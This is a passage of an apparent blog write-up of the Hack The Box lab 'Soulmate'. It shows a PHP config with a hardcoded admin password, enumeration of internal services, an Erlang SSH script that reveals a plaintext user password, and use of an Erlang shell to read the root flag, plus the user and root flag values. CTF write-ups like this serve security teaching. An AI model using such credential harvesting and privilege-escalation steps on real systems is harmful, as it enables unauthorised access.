class="line"><span class="string">        // Create default admin user if not exists</span></span><br><span class="line"><span class="string">        $adminCheck = $this-&gt;pdo-&gt;prepare(&quot;SELECT COUNT(*) FROM users WHERE username = ?&quot;);</span></span><br><span class="line"><span class="string">        $adminCheck-&gt;execute([&#x27;</span>admin<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if ($adminCheck-&gt;fetchColumn() == 0) &#123;</span></span><br><span class="line"><span class="string">            $adminPassword = password_hash(&#x27;</span>Crush4dmin990<span class="string">&#x27;, PASSWORD_DEFAULT);</span></span><br><span class="line"><span class="string">            $adminInsert = $this-&gt;pdo-&gt;prepare(&quot;</span></span><br><span class="line"><span class="string">                INSERT INTO users (username, password, is_admin, name) </span></span><br><span class="line"><span class="string">                VALUES (?, ?, 1, &#x27;</span>Administrator<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            &quot;);</span></span><br><span class="line"><span class="string">            $adminInsert-&gt;execute([&#x27;</span>admin<span class="string">&#x27;, $adminPassword]);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public function getConnection() &#123;</span></span><br><span class="line"><span class="string">        return $this-&gt;pdo;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Helper functions</span></span><br><span class="line"><span class="string">function redirect($path) &#123;</span></span><br><span class="line"><span class="string">    header(&quot;Location: $path&quot;);</span></span><br><span class="line"><span class="string">    exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function isLoggedIn() &#123;</span></span><br><span class="line"><span class="string">    return isset($_SESSION[&#x27;</span>user_id<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function isAdmin() &#123;</span></span><br><span class="line"><span class="string">    return isset($_SESSION[&#x27;</span>is_admin<span class="string">&#x27;]) &amp;&amp; $_SESSION[&#x27;</span>is_admin<span class="string">&#x27;] == 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function requireLogin() &#123;</span></span><br><span class="line"><span class="string">    if (!isLoggedIn()) &#123;</span></span><br><span class="line"><span class="string">        redirect(&#x27;</span>/login<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function requireAdmin() &#123;</span></span><br><span class="line"><span class="string">    requireLogin();</span></span><br><span class="line"><span class="string">    if (!isAdmin()) &#123;</span></span><br><span class="line"><span class="string">        redirect(&#x27;</span>/profile<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">$ </span></span><br></pre></td></tr></table></figure></div>
+
+<p>Checking internally running services:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -anot | <span class="built_in">head</span> -15</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 127.0.0.1:37147         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:4369          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:45465         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:9090          127.0.0.1:52040         TIME_WAIT   timewait (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:9090          127.0.0.1:56700         TIME_WAIT   timewait (15.39/0/0)</span><br><span class="line">tcp        0      0 172.19.0.1:47168        172.19.0.2:9090         TIME_WAIT   timewait (27.04/0/0)</span><br><span class="line">$ nc 127.0.0.1 2222</span><br><span class="line">SSH-2.0-Erlang/5.2.9</span><br></pre></td></tr></table></figure></div>
+
+<p>We will login into this internal erlang ssh service as ben and then we can run privileged commands:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/lib/erlang_login</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">login.escript</span><br><span class="line">start.escript</span><br><span class="line">$ <span class="built_in">cat</span> start.escript</span><br><span class="line"><span class="comment">#!/usr/bin/env escript</span></span><br><span class="line">%%! -sname ssh_runner</span><br><span class="line"></span><br><span class="line">main(_) -&gt;</span><br><span class="line">    application:start(asn1),</span><br><span class="line">    application:start(crypto),</span><br><span class="line">    application:start(public_key),</span><br><span class="line">    application:start(ssh),</span><br><span class="line"></span><br><span class="line">    io:format(<span class="string">&quot;Starting SSH daemon with logging...~n&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ssh:daemon(2222, [</span><br><span class="line">        &#123;ip, &#123;127,0,0,1&#125;&#125;,</span><br><span class="line">        &#123;system_dir, <span class="string">&quot;/etc/ssh&quot;</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;user_dir_fun, fun(User) -&gt;</span><br><span class="line">            Dir = filename:<span class="built_in">join</span>(<span class="string">&quot;/home&quot;</span>, User),</span><br><span class="line">            io:format(<span class="string">&quot;Resolving user_dir for ~p: ~s/.ssh~n&quot;</span>, [User, Dir]),</span><br><span class="line">            filename:<span class="built_in">join</span>(Dir, <span class="string">&quot;.ssh&quot;</span>)</span><br><span class="line">        end&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;connectfun, fun(User, PeerAddr, Method) -&gt;</span><br><span class="line">            io:format(<span class="string">&quot;Auth success for user: ~p from ~p via ~p~n&quot;</span>,</span><br><span class="line">                      [User, PeerAddr, Method]),</span><br><span class="line">            <span class="literal">true</span></span><br><span class="line">        end&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;failfun, fun(User, PeerAddr, Reason) -&gt;</span><br><span class="line">            io:format(<span class="string">&quot;Auth failed for user: ~p from ~p, reason: ~p~n&quot;</span>,</span><br><span class="line">                      [User, PeerAddr, Reason]),</span><br><span class="line">            <span class="literal">true</span></span><br><span class="line">        end&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;auth_methods, <span class="string">&quot;publickey,password&quot;</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;user_passwords, [&#123;<span class="string">&quot;ben&quot;</span>, <span class="string">&quot;HouseH0ldings998&quot;</span>&#125;]&#125;,</span><br><span class="line">        &#123;idle_time, infinity&#125;,</span><br><span class="line">        &#123;max_channels, 10&#125;,</span><br><span class="line">        &#123;max_sessions, 10&#125;,</span><br><span class="line">        &#123;parallel_login, <span class="literal">true</span>&#125;</span><br><span class="line">    ]) of</span><br><span class="line">        &#123;ok, _Pid&#125; -&gt;</span><br><span class="line">            io:format(<span class="string">&quot;SSH daemon running on port 2222. Press Ctrl+C to exit.~n&quot;</span>);</span><br><span class="line">        &#123;error, Reason&#125; -&gt;</span><br><span class="line">            io:format(<span class="string">&quot;Failed to start SSH daemon: ~p~n&quot;</span>, [Reason])</span><br><span class="line">    end,</span><br><span class="line"></span><br><span class="line">    receive</span><br><span class="line">        stop -&gt; ok</span><br><span class="line">    end.</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ssh ben@soulmate.htb</span><br><span class="line">ben@soulmate.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Last login: Wed Sep 10 07:27:01 2025 from 10.10.16.35</span></span><br><span class="line"><span class="string">ben@soulmate:~$ cat user.txt </span></span><br><span class="line"><span class="string">6ec36ee84548b207aec4a9c658b1f603</span></span><br><span class="line"><span class="string">ben@soulmate:~$ </span></span><br></pre></td></tr></table></figure></div>
+
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ben@soulmate:~$ ssh ben@127.0.0.1 -p 2222</span><br><span class="line">ben@127.0.0.1<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)</span></span><br><span class="line"><span class="string">(ssh_runner@soulmate)1&gt; os:cmd(&quot;cat /root/root.txt&quot;).</span></span><br><span class="line"><span class="string">&quot;17615be8a4767141b9c62744fcb3513c\n&quot;</span></span><br><span class="line"><span class="string">(ssh_runner@soulmate)2&gt; </span></span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for Soulmate, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Soulmate</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-02-15 18:29:21</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-02-15 18:33:26
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/02/15/Hackthebox-Soulmate/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/02/07/Hackthebox-Signed/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Signed</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Soulmate</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Subdomain-Enumeration"><span class="nav-text">Subdomain Enumeration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-CrushFTP-WebInterface"><span class="nav-text">Web Application - CrushFTP WebInterface </span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
